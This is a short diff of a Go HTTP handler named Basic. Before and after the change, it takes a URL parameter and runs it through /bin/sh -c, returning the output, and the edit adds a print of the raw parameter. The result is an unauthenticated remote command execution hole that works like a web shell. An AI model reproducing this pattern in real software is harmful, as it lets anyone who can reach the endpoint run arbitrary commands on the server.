@@ -45,10 +45,10 @@ func Basic() {
 		// 	return
 		// }
 
-		key := keys
+//		key := keys
 
-//		fmt.Println("Url Param 'key' is: " + string(key))
-		cmd := exec.Command("/bin/sh", "-c", string(key))
+		fmt.Println("Url Param 'key' is: " + string(keys))
+		cmd := exec.Command("/bin/sh", "-c", string(keys))
 		stdout, err := cmd.Output()
 
 		if err != nil {
